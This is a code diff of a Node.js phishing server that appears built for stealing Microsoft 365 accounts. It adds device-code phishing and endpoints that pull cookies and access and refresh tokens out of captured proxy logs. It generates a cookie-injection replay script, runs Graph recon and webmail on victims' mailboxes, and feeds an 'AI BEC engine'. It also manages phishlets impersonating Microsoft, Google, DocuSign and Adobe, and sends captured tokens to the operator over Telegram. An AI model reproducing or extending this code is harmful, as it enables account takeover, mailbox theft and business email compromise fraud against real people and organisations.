@@ -1,5 +1,5 @@
 // ================================================
-// 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁 — 𝙵𝙸𝙽𝙰𝙻 𝚆𝙸𝚃𝙷 𝚁𝙾𝚃𝙰𝚃𝙸𝙾𝙽 & 𝚂𝚃𝙴𝙰𝙻𝚃𝙷
+// 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁 — 𝙵𝙸𝙽𝙰𝙻 𝚆𝙸𝚃𝙷 𝙰𝙻𝙻 𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂
 // ================================================
 
 const http = require("http");
@@ -569,6 +569,712 @@ dashApp.get('/api/device/stats', (req, res) => {
     }
 });
 
+// ── ✅ DEVICE CODE MANAGEMENT ENDPOINTS ──
+
+dashApp.post('/api/device/manual', async (req, res) => {
+    const { user_code, device_code } = req.body;
+    if (!user_code && !device_code) {
+        return res.status(400).json({ error: 'user_code or device_code required' });
+    }
+    try {
+        const code = user_code || device_code;
+        const DEVICE_CLIENT_ID = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
+        const response = await axios.post(
+            'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
+            new URLSearchParams({
+                client_id: DEVICE_CLIENT_ID,
+                scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read offline_access'
+            }),
+            { 
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                timeout: 10000
+            }
+        );
+        const data = response.data;
+        const newFlow = {
+            device_code: data.device_code,
+            user_code: data.user_code,
+            verification_uri: data.verification_uri,
+            expires_in: data.expires_in,
+            interval: data.interval,
+            status: 'pending',
+            created: new Date().toISOString(),
+            approved: null,
+            username: null,
+            access_token: null,
+            refresh_token: null,
+            id_token: null,
+            manual_submitted: true,
+            client_id: DEVICE_CLIENT_ID,
+            session_id: crypto.randomBytes(16).toString('hex'),
+            token_type: 'Pending'
+        };
+        deviceFlows.push(newFlow);
+        saveDeviceFlows(deviceFlows);
+        res.json({ success: true, flow: newFlow });
+    } catch (error) {
+        res.status(500).json({ error: error.response?.data || error.message });
+    }
+});
+
+dashApp.post('/api/device/use', async (req, res) => {
+    const { session_id } = req.body;
+    if (!session_id) {
+        return res.status(400).json({ error: 'session_id required' });
+    }
+    try {
+        const flow = deviceFlows.find(f => f.session_id === session_id);
+        if (!flow) return res.status(404).json({ error: 'Flow not found' });
+        if (!flow.access_token) return res.status(400).json({ error: 'No access token available' });
+        res.json({ 
+            success: true, 
+            access_token: flow.access_token,
+            refresh_token: flow.refresh_token,
+            id_token: flow.id_token
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+dashApp.post('/api/prt/exchange', async (req, res) => {
+    const { prt } = req.body;
+    if (!prt) return res.status(400).json({ error: 'PRT required' });
+    try {
+        // PRT exchange requires Microsoft's internal APIs
+        // This is a placeholder — implement if you have PRT exchange logic
+        res.json({ error: 'PRT exchange requires additional implementation' });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+dashApp.delete('/api/device/flow/:deviceCode', (req, res) => {
+    const index = deviceFlows.findIndex(f => f.device_code === req.params.deviceCode);
+    if (index === -1) return res.status(404).json({ error: 'Flow not found' });
+    deviceFlows.splice(index, 1);
+    saveDeviceFlows(deviceFlows);
+    res.json({ success: true });
+});
+
+dashApp.get('/api/device/flow/:deviceCode', (req, res) => {
+    const flow = deviceFlows.find(f => f.device_code === req.params.deviceCode);
+    if (!flow) return res.status(404).json({ error: 'Flow not found' });
+    res.json({ success: true, flow });
+});
+
+// ── ✅ TOKEN VAULT ENDPOINTS ──
+const TokenVault = require('./token_vault.js');
+const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);
+
+dashApp.post('/api/vault/scan', (req, res) => {
+    try {
+        const tokens = vault.scanLogs();
+        res.json({ success: true, count: tokens.length });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.get('/api/vault/tokens', (req, res) => {
+    try {
+        res.json({ success: true, tokens: vault.tokens });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.get('/api/vault/users', (req, res) => {
+    try {
+        const users = vault.getTokensByUser();
+        res.json({ success: true, users });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.get('/api/vault/stats', (req, res) => {
+    try {
+        const stats = vault.getStats();
+        res.json({ success: true, stats });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/vault/healthcheck', async (req, res) => {
+    try {
+        const results = await vault.healthCheckAll();
+        res.json({ success: true, results });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/vault/exchange', async (req, res) => {
+    const { tokenValue } = req.body;
+    if (!tokenValue) return res.status(400).json({ error: 'Token value required' });
+
+    try {
+        const response = await axios.post(
+            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            new URLSearchParams({
+                client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                refresh_token: tokenValue,
+                grant_type: 'refresh_token',
+                scope: 'https://graph.microsoft.com/.default offline_access'
+            }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+        );
+        res.json({ success: true, data: response.data });
+    } catch (err) {
+        res.status(500).json({ 
+            error: err.response?.data?.error_description || err.message 
+        });
+    }
+});
+
+// ── ✅ RECON ENDPOINTS ──
+dashApp.post('/api/recon', async (req, res) => {
+    const { accessToken, refreshToken, email } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+
+    try {
+        const GraphClient = require('./graph_api.js');
+        const graph = new GraphClient(accessToken);
+        
+        const [profile, inbox, sent, contacts, events, manager, directReports, org] = await Promise.all([
+            graph.getUserProfile(),
+            graph.getInbox(50),
+            graph.getSentItems(50),
+            graph.getContacts(),
+            graph.getEvents(),
+            graph.getManager().catch(() => null),
+            graph.getDirectReports().catch(() => null),
+            graph.getOrganization().catch(() => null)
+        ]);
+
+        res.json({
+            success: true,
+            email: email || profile.mail || profile.userPrincipalName,
+            profile,
+            inbox: inbox?.value || [],
+            sent: sent?.value || [],
+            contacts: contacts?.value || [],
+            events: events?.value || [],
+            manager,
+            directReports: directReports?.value || [],
+            organization: org?.value?.[0] || null
+        });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/ai/analyze', async (req, res) => {
+    const { accessToken, refreshToken, email, groqApiKey } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+    if (!groqApiKey) return res.status(400).json({ error: 'Groq API key required' });
+
+    try {
+        const AIBECEngine = require('./ai_bec_engine.js');
+        const engine = new AIBECEngine(groqApiKey);
+        const result = await engine.runFullAnalysis(accessToken, refreshToken, email);
+        res.json({ success: true, ...result });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ── ✅ WEBMAIL ENDPOINTS ──
+dashApp.post('/api/webmail/folders', async (req, res) => {
+    const { accessToken } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+
+    try {
+        const GraphClient = require('./graph_api.js');
+        const graph = new GraphClient(accessToken);
+        const folders = await graph.getMailFolders();
+        res.json({ success: true, folders: folders.value || [] });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/webmail/emails', async (req, res) => {
+    const { accessToken, folderId = 'inbox', limit = 50, skip = 0 } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+
+    try {
+        const GraphClient = require('./graph_api.js');
+        const graph = new GraphClient(accessToken);
+        
+        let endpoint;
+        if (folderId === 'inbox') {
+            endpoint = `/mailFolders/inbox/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
+        } else if (folderId === 'sent') {
+            endpoint = `/mailFolders/sentitems/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
+        } else {
+            endpoint = `/mailFolders/${folderId}/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
+        }
+        
+        const emails = await graph.get(endpoint);
+        res.json({ success: true, emails: emails.value || [], count: emails.value?.length || 0 });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/webmail/email', async (req, res) => {
+    const { accessToken, messageId } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+    if (!messageId) return res.status(400).json({ error: 'Message ID required' });
+
+    try {
+        const GraphClient = require('./graph_api.js');
+        const graph = new GraphClient(accessToken);
+        const email = await graph.get(`/messages/${messageId}?$select=id,subject,sender,toRecipients,ccRecipients,bccRecipients,receivedDateTime,body,isRead,hasAttachments,importance,conversationId`);
+        res.json({ success: true, email });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/webmail/send', async (req, res) => {
+    const { accessToken, to, subject, body, replyToId, forwardFromId } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+    if (!to || !subject || !body) return res.status(400).json({ error: 'To, subject, and body required' });
+
+    try {
+        const GraphClient = require('./graph_api.js');
+        const graph = new GraphClient(accessToken);
+        
+        const emailData = {
+            message: {
+                subject: subject,
+                body: { content: body, contentType: 'HTML' },
+                toRecipients: to.map(email => ({ emailAddress: { address: email } }))
+            }
+        };
+
+        if (replyToId) {
+            emailData.message.conversationId = replyToId;
+        }
+
+        if (forwardFromId) {
+            emailData.message.forwardFrom = { id: forwardFromId };
+        }
+
+        const result = await graph.post('/me/sendMail', emailData);
+        res.json({ success: true, result });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/webmail/search', async (req, res) => {
+    const { accessToken, query, folderId = 'inbox', limit = 50 } = req.body;
+    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
+    if (!query) return res.status(400).json({ error: 'Search query required' });
+
+    try {
+        const GraphClient = require('./graph_api.js');
+        const graph = new GraphClient(accessToken);
+        const searchUrl = folderId === 'inbox' 
+            ? `/mailFolders/inbox/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`
+            : `/mailFolders/${folderId}/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`;
+        const results = await graph.get(searchUrl);
+        res.json({ success: true, emails: results.value || [] });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ── ✅ PHISHLETS ENDPOINTS ──
+dashApp.get('/api/phishlets', (req, res) => {
+    try {
+        const phishletsPath = path.join(__dirname, 'phishlets.json');
+        if (!fs.existsSync(phishletsPath)) {
+            const defaultPhishlets = {
+                "microsoft": {
+                    "name": "Microsoft Office 365",
+                    "icon": "microsoft",
+                    "file": "index_smQGUDpTF7PN.html",
+                    "entryPoint": "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true",
+                    "enabled": true
+                },
+                "google": {
+                    "name": "Google Workspace",
+                    "icon": "google",
+                    "file": "google_login.html",
+                    "entryPoint": "/google/login?redirect_uri=https://accounts.google.com/",
+                    "enabled": false
+                },
+                "docusign": {
+                    "name": "DocuSign",
+                    "icon": "docusign",
+                    "file": "docusign_login.html",
+                    "entryPoint": "/docusign/login?redirect_uri=https://account.docusign.com/",
+                    "enabled": false
+                },
+                "adobe": {
+                    "name": "Adobe Acrobat",
+                    "icon": "adobe",
+                    "file": "adobe_login.html",
+                    "entryPoint": "/adobe/login?redirect_uri=https://account.adobe.com/",
+                    "enabled": false
+                }
+            };
+            fs.writeFileSync(phishletsPath, JSON.stringify(defaultPhishlets, null, 2));
+            return res.json({ success: true, phishlets: defaultPhishlets });
+        }
+        
+        const phishlets = JSON.parse(fs.readFileSync(phishletsPath, 'utf-8'));
+        res.json({ success: true, phishlets });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/phishlets/toggle', (req, res) => {
+    const { id, enabled } = req.body;
+    try {
+        const phishletsPath = path.join(__dirname, 'phishlets.json');
+        const phishlets = JSON.parse(fs.readFileSync(phishletsPath, 'utf-8'));
+        if (phishlets[id]) {
+            phishlets[id].enabled = enabled;
+            fs.writeFileSync(phishletsPath, JSON.stringify(phishlets, null, 2));
+            res.json({ success: true });
+        } else {
+            res.status(404).json({ error: 'Phishlet not found' });
+        }
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ── ✅ VISITS ENDPOINTS ──
+dashApp.get('/api/visits', (req, res) => {
+    try {
+        const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
+        if (!fs.existsSync(VISITS_LOG_FILE)) {
+            return res.json({ visits: [], total: 0, uniqueIPs: 0, today: 0, week: 0 });
+        }
+        
+        const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
+        const lines = content.split('\n').filter(line => line.trim());
+        const visits = lines.map(line => JSON.parse(line));
+        visits.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
+        const now = new Date();
+        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
+        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
+        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
+        
+        res.json({
+            visits: visits.slice(0, 100),
+            total: visits.length,
+            uniqueIPs: uniqueIPs,
+            today: todayVisits.length,
+            week: weekVisits.length
+        });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.get('/api/visits/stats', (req, res) => {
+    try {
+        const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
+        if (!fs.existsSync(VISITS_LOG_FILE)) {
+            return res.json({ total: 0, uniqueIPs: 0, today: 0, week: 0 });
+        }
+        const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
+        const lines = content.split('\n').filter(line => line.trim());
+        const visits = lines.map(line => JSON.parse(line));
+        const now = new Date();
+        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
+        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
+        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
+        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
+        res.json({
+            total: visits.length,
+            uniqueIPs: uniqueIPs,
+            today: todayVisits.length,
+            week: weekVisits.length
+        });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ── ✅ ANALYTICS ENDPOINTS ──
+dashApp.get('/api/analytics', (req, res) => {
+    try {
+        const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
+        let visits = [];
+        let captures = [];
+        
+        if (fs.existsSync(VISITS_LOG_FILE)) {
+            const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
+            const lines = content.split('\n').filter(line => line.trim());
+            visits = lines.map(line => JSON.parse(line));
+        }
+        
+        const logFiles = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
+        captures = logFiles.map(f => {
+            const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
+            return { file: f, modified: stat.mtime, size: stat.size };
+        });
+        
+        const now = new Date();
+        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
+        const monthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
+        
+        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
+        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
+        const monthVisits = visits.filter(v => new Date(v.timestamp) >= monthAgo);
+        
+        const todayCaptures = captures.filter(c => c.modified >= today);
+        const weekCaptures = captures.filter(c => c.modified >= weekAgo);
+        const monthCaptures = captures.filter(c => c.modified >= monthAgo);
+        
+        const conversionRate = {
+            today: todayVisits.length > 0 ? (todayCaptures.length / todayVisits.length * 100).toFixed(1) : 0,
+            week: weekVisits.length > 0 ? (weekCaptures.length / weekVisits.length * 100).toFixed(1) : 0,
+            month: monthVisits.length > 0 ? (monthCaptures.length / monthVisits.length * 100).toFixed(1) : 0,
+            total: visits.length > 0 ? (captures.length / visits.length * 100).toFixed(1) : 0
+        };
+        
+        const dailyCaptures = {};
+        const dailyVisits = {};
+        for (let i = 6; i >= 0; i--) {
+            const d = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
+            const key = d.toDateString();
+            dailyCaptures[key] = 0;
+            dailyVisits[key] = 0;
+        }
+        
+        captures.forEach(c => {
+            const key = new Date(c.modified).toDateString();
+            if (dailyCaptures.hasOwnProperty(key)) dailyCaptures[key]++;
+        });
+        
+        visits.forEach(v => {
+            const key = new Date(v.timestamp).toDateString();
+            if (dailyVisits.hasOwnProperty(key)) dailyVisits[key]++;
+        });
+        
+        const domains = {};
+        visits.forEach(v => {
+            const url = v.url || '';
+            const match = url.match(/https?:\/\/([^\/]+)/);
+            if (match) {
+                const domain = match[1];
+                domains[domain] = (domains[domain] || 0) + 1;
+            }
+        });
+        const topDomains = Object.entries(domains)
+            .sort((a, b) => b[1] - a[1])
+            .slice(0, 5)
+            .map(([domain, count]) => ({ domain, count }));
+        
+        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
+        
+        res.json({
+            success: true,
+            analytics: {
+                visits: {
+                    total: visits.length,
+                    today: todayVisits.length,
+                    week: weekVisits.length,
+                    month: monthVisits.length
+                },
+                captures: {
+                    total: captures.length,
+                    today: todayCaptures.length,
+                    week: weekCaptures.length,
+                    month: monthCaptures.length
+                },
+                conversionRate,
+                uniqueIPs,
+                dailyCaptures,
+                dailyVisits,
+                topDomains,
+                captureTimeline: captures.map(c => ({
+                    date: c.modified,
+                    file: c.file,
+                    size: c.size
+                }))
+            }
+        });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ── ✅ TOKEN REPLAY ENDPOINTS ──
+dashApp.get('/api/replay/:filename', (req, res) => {
+    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
+    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Log not found' });
+
+    try {
+        const content = fs.readFileSync(filePath, 'utf-8');
+        const lines = content.split('\n').filter(line => line.trim());
+        let allCookies = [];
+        let targetDomain = null;
+        let accessToken = null;
+        let refreshToken = null;
+
+        for (const line of lines) {
+            try {
+                const entry = JSON.parse(line);
+                const iv = Object.keys(entry)[0];
+                const encrypted = entry[iv];
+                const decrypted = decryptData(encrypted, iv);
+                const obj = JSON.parse(decrypted);
+
+                if (!targetDomain && obj.proxyRequestURL) {
+                    try {
+                        const url = new URL(obj.proxyRequestURL);
+                        targetDomain = url.hostname;
+                    } catch (e) {}
+                }
+
+                const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
+                if (setCookie) {
+                    const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
+                    for (const cookie of cookieArray) {
+                        const [nameValue] = cookie.split(';');
+                        if (nameValue) allCookies.push(nameValue.trim());
+                    }
+                }
+
+                const body = obj.proxyRequestBody;
+                if (body) {
+                    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                    const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
+                    const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
+                    if (accessMatch) accessToken = decodeURIComponent(accessMatch[1]);
+                    if (refreshMatch) refreshToken = decodeURIComponent(refreshMatch[1]);
+                }
+            } catch (e) {}
+        }
+
+        if (allCookies.length === 0 && !accessToken) {
+            return res.status(404).json({ error: 'No cookies or tokens found' });
+        }
+
+        const replayScript = `
+            (function() {
+                const cookies = ${JSON.stringify(allCookies)};
+                const targetDomain = ${JSON.stringify(targetDomain || 'login.microsoftonline.com')};
+                const accessToken = ${JSON.stringify(accessToken)};
+                const refreshToken = ${JSON.stringify(refreshToken)};
+                
+                cookies.forEach(c => {
+                    document.cookie = c + '; path=/; domain=' + targetDomain + '; Secure; SameSite=None';
+                });
+                
+                let msg = '🍪 ' + cookies.length + ' cookies injected.';
+                if (accessToken) {
+                    msg += '\\n🔑 Access token: ' + accessToken.slice(0, 20) + '...';
+                    localStorage.setItem('evil_token', accessToken);
+                }
+                if (refreshToken) {
+                    msg += '\\n🔄 Refresh token: ' + refreshToken.slice(0, 20) + '...';
+                }
+                alert(msg);
+                window.location.href = 'https://' + targetDomain;
+            })();
+        `;
+
+        res.json({
+            success: true,
+            cookieCount: allCookies.length,
+            targetDomain: targetDomain || 'login.microsoftonline.com',
+            hasAccessToken: !!accessToken,
+            hasRefreshToken: !!refreshToken,
+            replayScript: replayScript,
+            cookieString: allCookies.join('; ')
+        });
+
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.get('/api/tokens/:filename', (req, res) => {
+    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
+    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Log not found' });
+
+    try {
+        const content = fs.readFileSync(filePath, 'utf-8');
+        const lines = content.split('\n').filter(line => line.trim());
+        const tokens = {
+            access_tokens: [],
+            refresh_tokens: [],
+            id_tokens: [],
+            cookies: [],
+            sessions: []
+        };
+
+        for (const line of lines) {
+            try {
+                const entry = JSON.parse(line);
+                const iv = Object.keys(entry)[0];
+                const encrypted = entry[iv];
+                const decrypted = decryptData(encrypted, iv);
+                const obj = JSON.parse(decrypted);
+
+                const body = obj.proxyRequestBody;
+                if (body) {
+                    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                    const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
+                    const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
+                    const idMatch = bodyStr.match(/id_token=([^&]+)/i);
+                    if (accessMatch) tokens.access_tokens.push(decodeURIComponent(accessMatch[1]));
+                    if (refreshMatch) tokens.refresh_tokens.push(decodeURIComponent(refreshMatch[1]));
+                    if (idMatch) tokens.id_tokens.push(decodeURIComponent(idMatch[1]));
+
+                    try {
+                        const json = typeof body === 'string' ? JSON.parse(body) : body;
+                        if (json.access_token) tokens.access_tokens.push(json.access_token);
+                        if (json.refresh_token) tokens.refresh_tokens.push(json.refresh_token);
+                        if (json.id_token) tokens.id_tokens.push(json.id_token);
+                    } catch (e) {}
+                }
+
+                const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
+                if (setCookie) {
+                    const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
+                    for (const cookie of cookieArray) {
+                        const [nameValue] = cookie.split(';');
+                        if (nameValue) tokens.cookies.push(nameValue.trim());
+                    }
+                }
+
+                const sessionCookie = obj.proxyRequestHeaders?.cookie;
+                if (sessionCookie) {
+                    tokens.sessions.push(sessionCookie);
+                }
+            } catch (e) {}
+        }
+
+        res.json({
+            success: true,
+            filename: req.params.filename,
+            tokens: tokens
+        });
+
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
 // ── ✅ MAIN APP ──
 const app = express();
 
@@ -576,7 +1282,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ── ✅ DEVICE CODE API (WITH ROTATION & STEALTH) ──
+// ── ✅ DEVICE CODE API ──
 app.post('/device/request', async (req, res) => {
     if (!axios) {
         return res.status(500).json({ error: 'axios not installed. Run: npm install axios' });
@@ -584,14 +1290,12 @@ app.post('/device/request', async (req, res) => {
     try {
         console.log('📱 Device code requested');
         
-        // ── ✅ STEALTH: ROTATE CLIENT ID ──
         const clientId = getRandomClientId();
         const userAgent = getRandomUserAgent();
         
         console.log(`🔄 Using client: ${clientId}`);
         console.log(`🔄 Using UA: ${userAgent.slice(0, 50)}...`);
         
-        // ── ✅ STEALTH: RANDOM DELAY ──
         await randomDelay(300, 800);
         
         const response = await axios.post(
@@ -611,6 +1315,7 @@ app.post('/device/request', async (req, res) => {
         const data = response.data;
         console.log('✅ Device code obtained:', data.user_code);
         
+        const tokenType = 'Pending';
         const newFlow = {
             device_code: data.device_code,
             user_code: data.user_code,
@@ -624,9 +1329,11 @@ app.post('/device/request', async (req, res) => {
             access_token: null,
             refresh_token: null,
             id_token: null,
-            manual_submitted: null,
+            manual_submitted: false,
             client_id: clientId,
-            user_agent: userAgent
+            user_agent: userAgent,
+            session_id: crypto.randomBytes(16).toString('hex'),
+            token_type: tokenType
         };
         deviceFlows.push(newFlow);
         saveDeviceFlows(deviceFlows);
@@ -673,7 +1380,6 @@ app.post('/device/token', async (req, res) => {
         const clientId = flow?.client_id || CLIENT_IDS[0];
         const userAgent = getRandomUserAgent();
         
-        // ── ✅ STEALTH: RANDOM DELAY ──
         await randomDelay(200, 600);
         
         const response = await axios.post(
@@ -694,12 +1400,17 @@ app.post('/device/token', async (req, res) => {
         const tokens = response.data;
         console.log('✅ Tokens obtained!');
         
+        const tokenType = tokens.access_token ? 'Access Token' : 
+                         tokens.refresh_token ? 'Refresh Token' : 
+                         tokens.id_token ? 'ID Token' : 'Unknown';
+        
         if (flow) {
             flow.status = 'approved';
             flow.approved = new Date().toISOString();
             flow.access_token = tokens.access_token;
             flow.refresh_token = tokens.refresh_token;
             flow.id_token = tokens.id_token;
+            flow.token_type = tokenType;
             if (tokens.id_token) {
                 try {
                     const payload = JSON.parse(Buffer.from(tokens.id_token.split('.')[1], 'base64').toString());
@@ -715,6 +1426,7 @@ app.post('/device/token', async (req, res) => {
 🔄 **Refresh Token:** \`${tokens.refresh_token?.slice(0, 30)}...\`
 🆔 **ID Token:** \`${tokens.id_token?.slice(0, 30)}...\`
 👤 **User:** ${flow?.username || 'Unknown'}
+📱 **Token Type:** ${tokenType}
         `;
         try {
             await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -757,20 +1469,14 @@ app.get('/device', (req, res) => {
                     body { font-family: 'Segoe UI', Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; background: #f5f5f5; }
                     .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                     #codeDisplay { font-size: 52px; font-weight: bold; padding: 30px; background: #f0f0f0; border-radius: 10px; margin: 20px 0; letter-spacing: 6px; font-family: 'Courier New', monospace; }
-                    button { padding: 12px 24px; font-size: 16px; cursor: pointer; background: #0078d4; color: white; border: none; border-radius: 5px; margin: 5px; transition: background 0.2s; }
+                    button { padding: 12px 24px; font-size: 16px; cursor: pointer; background: #0078d4; color: white; border: none; border-radius: 5px; margin: 5px; }
                     button:hover { background: #005a9e; }
-                    button.secondary { background: #6c757d; }
-                    button.secondary:hover { background: #5a6268; }
+                    .status { margin: 20px 0; padding: 12px; border-radius: 5px; }
+                    .pending { background: #fff3cd; color: #856404; }
+                    .success { background: #d4edda; color: #155724; }
+                    .error { background: #f8d7da; color: #721c24; }
+                    .info { background: #d1ecf1; color: #0c5460; }
                     .link { color: #0078d4; text-decoration: none; }
-                    .link:hover { text-decoration: underline; }
-                    .status { margin: 20px 0; padding: 12px; border-radius: 5px; font-weight: 500; }
-                    .pending { background: #fff3cd; color: #856404; border: 1px solid #ffc107; }
-                    .success { background: #d4edda; color: #155724; border: 1px solid #28a745; }
-                    .error { background: #f8d7da; color: #721c24; border: 1px solid #dc3545; }
-                    .info { background: #d1ecf1; color: #0c5460; border: 1px solid #17a2b8; }
-                    .steps { text-align: left; margin: 20px 0; padding: 15px; background: #f8f9fa; border-radius: 8px; }
-                    .steps li { margin: 8px 0; }
-                    .footer { margin-top: 30px; font-size: 12px; color: #6c757d; }
                 </style>
             </head>
             <body>
@@ -778,57 +1484,28 @@ app.get('/device', (req, res) => {
                     <h1>🔐 Device Login</h1>
                     <p>Enter the code on your device to sign in</p>
                     <div id="codeDisplay">Loading...</div>
-                    <p>
-                        <a href="https://login.microsoft.com/device" target="_blank" class="link">
-                            https://login.microsoft.com/device
-                        </a>
-                    </p>
-                    <div class="steps">
-                        <ol>
-                            <li>Open the link above on your device</li>
-                            <li>Enter the code: <strong id="codeRef">---</strong></li>
-                            <li>Approve the sign-in request</li>
-                        </ol>
-                    </div>
+                    <p><a href="https://login.microsoft.com/device" target="_blank" class="link">https://login.microsoft.com/device</a></p>
                     <div id="status" class="status pending">⏳ Waiting for device approval...</div>
-                    <div id="clientInfo" class="status info" style="font-size:11px;padding:5px;margin:5px 0;">Client: Loading...</div>
                     <div>
                         <button onclick="generateCode()">🔄 New Code</button>
                         <button onclick="copyCode()">📋 Copy Code</button>
-                        <button onclick="checkStatus()" class="secondary">🔄 Check Status</button>
-                    </div>
-                    <div class="footer">
-                        <span id="timestamp"></span>
+                        <button onclick="checkStatus()">🔄 Check Status</button>
                     </div>
                 </div>
                 <script>
                     let currentCode = '';
                     let currentDeviceCode = '';
-                    let pollingInterval = null;
-                    
-                    function updateTimestamp() {
-                        document.getElementById('timestamp').textContent = '🕒 ' + new Date().toLocaleTimeString();
-                    }
-                    setInterval(updateTimestamp, 1000);
-                    updateTimestamp();
                     
                     async function generateCode() {
                         try {
-                            document.getElementById('status').className = 'status info';
-                            document.getElementById('status').textContent = '⏳ Generating new code...';
-                            
